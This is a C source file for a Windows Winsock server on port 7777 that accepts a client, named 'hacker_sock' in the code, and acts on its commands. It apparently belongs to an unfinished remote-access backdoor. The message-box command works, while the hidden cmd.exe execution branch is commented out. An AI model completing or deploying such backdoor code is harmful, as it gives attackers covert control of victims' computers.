#include <stdio.h>
#include <tchar.h>
#include <ws2tcpip.h>

#include "Server.h"
#include "Tools.h"

#pragma comment(lib, "Ws2_32.lib")

SOCKET InitServer()
{
	return 0;
}

VOID RunServer( )
{
	INT     iResult = 0;
	WSADATA wsaData;
	if (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		_tprintf("WSAStartup failed with error: %d\n", iResult);

		return ;
	}
	_tprintf("Startup finished\n");

	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listen_sock == INVALID_SOCKET)
	{
		_tprintf("socket failed with error: %ld\n", WSAGetLastError());

		WSACleanup();

		return;
	}

	SOCKADDR_IN addr_sock;
	addr_sock.sin_family      = AF_INET;
	addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
	addr_sock.sin_port        = htons(7777);
	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(struct sockaddr)))
	{
		_tprintf("bind failed with error: %d\n", WSAGetLastError());

		closesocket(listen_sock);
		WSACleanup();

		return;
	}
	_tprintf("Binding socket finished\n");

	if (listen(listen_sock, 1))
	{
		_tprintf("listen failed with error: %d\n", WSAGetLastError());

		closesocket(listen_sock);
		WSACleanup();

		return;
	}
	_tprintf("Started to listen\n");

	TCHAR  cmd[CMD_LENGTH + 1]    = { 0 }, // (cmd + space) + '\0'
		  args[MAX_BUFFER_LENGTH] = { 0 };
	while (TRUE)
	{
		_tprintf("Waiting for the client\n");

		SOCKET hacker_sock = INVALID_SOCKET; 
		if ((hacker_sock = accept(listen_sock, NULL, NULL)) == INVALID_SOCKET)
		{
			_tprintf("accept failed with error: %d\n", WSAGetLastError());

			closesocket(listen_sock);

			WSACleanup(); 
			return;
		}

		_tprintf("Connected\n");
		while (TRUE)
		{
			int bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
			recv(hacker_sock, args, ARGS_LENGTH, 0);

			if (!bytes || bytes == SOCKET_ERROR)
				break;

			_tprintf("cmd:'%s', args:'%s'\n", cmd, args);
			switch (cmd[0])
			{
			case MESSAGE:
				MessageBoxExA(NULL, args, TEXT("GG WP"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
				break;

			case EXECUTE: {
				//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
				//strcat_s(buf, ARGS_LENGTH + 3, args);
				// SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
				// shell.fMask = SEE_MASK_NOCLOSEPROCESS;
				// shell.lpFile = "cmd.exe";
				// shell.lpParameters = "ipconfig > a.txt";
				// shell.nShow = SW_HIDE;
				// ShellExecuteEx(&shell);
				// WaitForSingleObject(shell.hProcess, INFINITE);
				//ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
				break; 
			}

			default:
				break;
			}	

			// send(hacker_sock, success, strlen(success), 0);
		}

		closesocket(hacker_sock);
		_tprintf("Client disconnected\n");
	}
}
